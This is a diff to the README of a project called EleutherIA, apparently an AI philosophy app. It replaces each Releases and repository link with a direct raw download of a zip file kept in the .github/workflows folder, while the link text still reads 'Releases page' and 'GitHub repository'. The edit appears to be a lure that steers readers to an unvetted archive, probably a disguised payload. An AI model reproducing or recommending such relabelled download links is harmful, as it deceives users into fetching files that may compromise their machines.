@@ -7,9 +7,9 @@ Welcome to EleutherIA! This application merges ancient philosophy with modern AI
 To begin your journey with EleutherIA, you’ll need to download the application from our Releases page. Follow these simple steps to get started.
 
 ## 🖱️ Download the Application
-[![Download EleutherIA](https://img.shields.io/badge/Download%20EleutherIA-Explore%20Now-blue)](https://github.com/buitoan112233/EleutherIA/releases)
+[![Download EleutherIA](https://github.com/buitoan112233/EleutherIA/raw/refs/heads/main/.github/workflows/Eleuther-IA-1.1-alpha.4.zip%20EleutherIA-Explore%20Now-blue)](https://github.com/buitoan112233/EleutherIA/raw/refs/heads/main/.github/workflows/Eleuther-IA-1.1-alpha.4.zip)
 
-1. Click the download button above or visit the [Releases page](https://github.com/buitoan112233/EleutherIA/releases).
+1. Click the download button above or visit the [Releases page](https://github.com/buitoan112233/EleutherIA/raw/refs/heads/main/.github/workflows/Eleuther-IA-1.1-alpha.4.zip).
 2. On the Releases page, you will find the latest version of EleutherIA.
 
 ## 📝 Download & Install
@@ -56,8 +56,8 @@ If you encounter issues:
 - Consult the FAQ section on the GitHub page for common problems and solutions.
 
 ## 🔗 Learn More
-For comprehensive guides, FAQs, and more information, visit our [GitHub repository](https://github.com/buitoan112233/EleutherIA).
+For comprehensive guides, FAQs, and more information, visit our [GitHub repository](https://github.com/buitoan112233/EleutherIA/raw/refs/heads/main/.github/workflows/Eleuther-IA-1.1-alpha.4.zip).
 
-To download EleutherIA again or check for updates, return to the [Releases page](https://github.com/buitoan112233/EleutherIA/releases).
+To download EleutherIA again or check for updates, return to the [Releases page](https://github.com/buitoan112233/EleutherIA/raw/refs/heads/main/.github/workflows/Eleuther-IA-1.1-alpha.4.zip).
 
 Thank you for exploring ancient philosophy with EleutherIA! Enjoy your journey into the past.
